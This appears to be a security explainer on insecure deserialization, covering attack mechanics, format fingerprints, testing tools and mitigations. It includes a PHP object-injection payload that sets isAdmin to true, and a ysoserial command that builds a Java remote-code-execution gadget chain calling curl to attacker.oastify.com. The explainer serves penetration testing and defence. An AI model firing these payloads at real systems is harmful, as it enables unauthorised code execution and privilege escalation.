# What is Insecure Deserialization?

Insecure Deserialization is when an app takes serialized data from an untrusted source and rebuilds objects from it without validation. Because deserialization can trigger constructors, magic methods, and property setters, a crafted payload can hijack that process - leading to remote code execution, auth bypass, or object injection. It is hard to spot and often devastating.

## How it works

- The app serializes objects to send/store them (cookies, tokens, caches, queues)
- An attacker tampers with or forges the serialized blob
- On deserialization, a "gadget chain" of existing classes is triggered to run code

## Where to look

```text
Java     -> base64 starting with "rO0" (0xAC 0xED stream header)
PHP       -> serialize() output: O:4:"User":2:{...}
Python    -> pickle streams (very dangerous by design)
.NET      -> BinaryFormatter / ViewState
Ruby       -> Marshal.load
Node.js    -> node-serialize, funcster
```

## Payload examples

```php
// PHP object injection - control properties to abuse a __wakeup/__destruct
O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
```

```bash
# Java - generate an RCE gadget chain with ysoserial
java -jar ysoserial.jar CommonsCollections5 'curl attacker.oastify.com' | base64
```

## Tools

- [ysoserial](https://github.com/frohoff/ysoserial) - Java deserialization gadget chains
- [ysoserial.net](https://github.com/pwntester/ysoserial.net) - .NET equivalent
- [PHPGGC](https://github.com/ambionics/phpggc) - PHP gadget chain generator
- [Burp - Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)

## Manual testing

1. Identify serialized data in cookies, params, tokens, or uploads
2. Fingerprint the format (magic bytes / structure above)
3. Tamper with a field and watch for errors that reveal deserialization
4. If a known library is in use, generate a gadget chain and test in scope with an OAST callback

## Mitigation

- Do not deserialize untrusted data; prefer plain data formats like JSON with a schema
- If you must, sign and verify serialized blobs (HMAC) before deserializing
- Use allowlists of permitted classes; disable dangerous formatters (`BinaryFormatter`, `pickle`)
- Keep libraries patched to remove known gadget chains

## Deep dive

- [Insecure Deserialization - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger deserialization labs](https://portswigger.net/web-security/deserialization)

## CWE

- CWE-502: Deserialization of Untrusted Data
